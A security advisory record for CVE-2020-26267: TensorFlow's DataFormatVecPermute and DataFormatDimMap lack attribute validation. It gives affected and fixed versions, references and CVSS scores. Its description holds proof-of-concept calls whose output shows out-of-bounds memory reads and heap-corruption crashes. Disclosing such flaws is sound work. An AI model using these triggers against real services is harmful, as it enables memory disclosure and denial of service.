{
  "Identifier": "CVE-2020-26267",
  "PackageSlug": "pypi/tensorflow",
  "Title": "Lack of validation in data format attributes in TensorFlow",
  "Description": "The `tf.raw_ops.DataFormatVecPermute` API does not validate the `src_format` and `dst_format` attributes. [The code](https://github.com/tensorflow/tensorflow/blob/304b96815324e6a73d046df10df6626d63ac12ad/tensorflow/core/kernels/data_format_ops.cc) assumes that these two arguments define a permutation of `NHWC`.\n\nHowever, these assumptions are not checked and this can result in uninitialized memory accesses, read outside of bounds and even crashes.\n\n```python\n\u003e\u003e\u003e import tensorflow as tf\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,4], src_format='1234', dst_format='1234')\n\u003ctf.Tensor: shape=(2,), dtype=int32, numpy=array([4, 757100143], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,4], src_format='HHHH', dst_format='WWWW')\n\u003ctf.Tensor: shape=(2,), dtype=int32, numpy=array([4, 32701], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,4], src_format='H', dst_format='W')\n\u003ctf.Tensor: shape=(2,), dtype=int32, numpy=array([4, 32701], dtype=int32)\u003e\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4],\nsrc_format='1234', dst_format='1253')\n\u003ctf.Tensor: shape=(4,), dtype=int32, numpy=array([4, 2, 939037184, 3], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4],\nsrc_format='1234', dst_format='1223')\n\u003ctf.Tensor: shape=(4,), dtype=int32, numpy=array([4, 32701, 2, 3], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4],\nsrc_format='1224', dst_format='1423')\n\u003ctf.Tensor: shape=(4,), dtype=int32, numpy=array([1, 4, 3, 32701], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4], src_format='1234', dst_format='432')\n\u003ctf.Tensor: shape=(4,), dtype=int32, numpy=array([4, 3, 2, 32701], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4],\nsrc_format='12345678', dst_format='87654321')\nmunmap_chunk(): invalid pointer\nAborted\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[[1,5],[2,6],[3,7],[4,8]],\nsrc_format='12345678', dst_format='87654321')\n\u003ctf.Tensor: shape=(4, 2), dtype=int32, numpy=\narray([[71364624,        0],\n[71365824,        0],\n[     560,        0],\n[      48,        0]], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[[1,5],[2,6],[3,7],[4,8]],\nsrc_format='12345678', dst_format='87654321')\nfree(): invalid next size (fast)\nAborted\n```\n\nA similar issue occurs in `tf.raw_ops.DataFormatDimMap`, for the same reasons:\n\n```python\n\u003e\u003e\u003e tf.raw_ops.DataFormatDimMap(x=[[1,5],[2,6],[3,7],[4,8]], src_format='1234',\n\u003e\u003e\u003e dst_format='8765')\n\u003ctf.Tensor: shape=(4, 2), dtype=int32, numpy=\narray([[1954047348, 1954047348],\n[1852793646, 1852793646],\n[1954047348, 1954047348],\n[1852793632, 1852793632]], dtype=int32)\u003e\n```",
  "Date": "2024-10-28",
  "Pubdate": "2020-12-10",
  "AffectedRange": "\u003c1.15.5||\u003e=2.0.0,\u003c2.0.4||\u003e=2.1.0,\u003c2.1.3||\u003e=2.2.0,\u003c2.2.2||\u003e=2.3.0,\u003c2.3.2",
  "FixedVersions": [
    "1.15.5",
    "2.0.4",
    "2.1.3",
    "2.2.2",
    "2.3.2"
  ],
  "AffectedVersions": "All versions before 1.15.5, all versions starting from 2.0.0 before 2.0.4, all versions starting from 2.1.0 before 2.1.3, all versions starting from 2.2.0 before 2.2.2, all versions starting from 2.3.0 before 2.3.2",
  "NotImpacted": "All versions starting from 1.15.5 before 2.0.0, all versions starting from 2.0.4 before 2.1.0, all versions starting from 2.1.3 before 2.2.0, all versions starting from 2.2.2 before 2.3.0, all versions starting from 2.3.2",
  "Solution": "Upgrade to versions 1.15.5, 2.0.4, 2.1.3, 2.2.2, 2.3.2 or above.",
  "Urls": [
    "https://nvd.nist.gov/vuln/detail/CVE-2020-26267",
    "https://github.com/advisories/GHSA-c9f3-9wfr-wgh7",
    "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7",
    "https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae",
    "https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2020-298.yaml",
    "https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2020-333.yaml",
    "https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow/PYSEC-2020-140.yaml",
    "https://github.com/tensorflow/tensorflow"
  ],
  "CvssV2": "AV:L/AC:L/Au:S/C:P/I:P/A:P",
  "CvssV3": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
  "UUID": "1363668c-4a7a-4ad1-bb92-712d77f9de20"
}